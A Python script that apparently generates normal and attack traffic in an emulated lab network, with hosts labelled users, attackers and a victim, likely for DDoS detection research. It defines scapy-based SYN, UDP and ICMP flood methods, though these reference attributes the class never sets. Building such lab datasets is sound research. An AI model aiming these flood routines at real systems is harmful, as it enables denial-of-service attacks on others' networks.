from scapy.all import *
from scapy.layers.inet import *
from config.config import Config
import time

class Generator:
    def __init__(self, net):
        net.start()
    
        self.h1 = net.get('h1')
        self.h2 = net.get('h2')
        self.h3 = net.get('h3')
        self.h4 = net.get('h4')
        self.h5 = net.get('h5')
        self.h6 = net.get('h6')
        self.h7 = net.get('h7')
        self.h8 = net.get('h8')
        self.h9 = net.get('h9')

        self.users = [self.h2, self.h3, self.h4, self.h6, self.h7, self.h8]
        self.attackers = [self.h1, self.h9]
        self.victim = [self.h5]

        self.config = Config()

    def normal(self):
        duration = self.config.get_setting('duration')

        print("Generating traffic ...")    
        self.victim[0].cmd('cd resources')
        self.victim[0].cmd('python3 -m http.server 80 &')
        self.victim[0].cmd('iperf -s -p 5050 &')
        self.victim[0].cmd('iperf -s -u -p 5051 &')
        time.sleep(2)

        while 1:    
            print("--------------------------------------------------------------------------------") 
            
            src = choice(self.users)
            src_ip = src.IP()
            dst_ip = self.victim[0].IP()
            
            src.cmd('cd downloads')
            src.cmd("ping {} -c 10 &".format(dst_ip))
            src.cmd("iperf -p 5050 -c {}".format(dst_ip))
            src.cmd("iperf -p 5051 -u -c 10.0.0.1")
            
            print("%s Downloading index.html from victim" % src_ip)
            src.cmd("wget http://{}/index.html".format(dst_ip))
            # print("%s Downloading test.zip from victim" % src_ip)
            # src.cmd("wget http://{}/test.zip".format(dst_ip))
            
            # self.victim[0].cmd("rm -rf downloads/*")

            time.sleep(1/duration)
    def send_packet(self, src_ips, dst_ips, src_ports, dst_ports, duration, rate):
        for src_ip, dst_ip, src_port, dst_port in zip(src_ips, dst_ips, src_ports, dst_ports):
            for _ in range(duration * rate):
                packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port)
                # 计算每个包的发送间隔（秒）
                interval = 1 / rate
                print(f"Sending packet from {src_ip} to {dst_ip}")
                time.sleep(interval)
                # start_time = time.time()
                # while (time.time() - start_time) < duration:
                #     print(f"Sending packet from {src_ip} to {dst_ip}")
                #     time.sleep(interval)
                #     continue
                #     # 发送数据包
                #     send(packet, verbose=False)
                #     # 等待指定的间隔时间
                #     time.sleep(interval)

    # def normal(self, src_ips, dst_ips, src_ports, dst_ports, duration, rate):
    #     self.send_packet(src_ips, dst_ips, src_ports, dst_ports, duration, rate)

    def syn_flood(self):
        for _ in range(self.packet_count):
            packet = IP(src=self.src_ip, dst=self.dst_ip) / TCP(sport=self.src_port, dport=self.dst_port, flags='S')
            send(packet, verbose=0)

    def udp_flood(self):
        for _ in range(self.packet_count):
            packet = IP(src=self.src_ip, dst=self.dst_ip) / UDP(sport=self.src_port, dport=self.dst_port)
            send(packet, verbose=0)

    def icmp_flood(self):
        for _ in range(self.packet_count):
            packet = IP(src=self.src_ip, dst=self.dst_ip) / ICMP()
            send(packet, verbose=0)
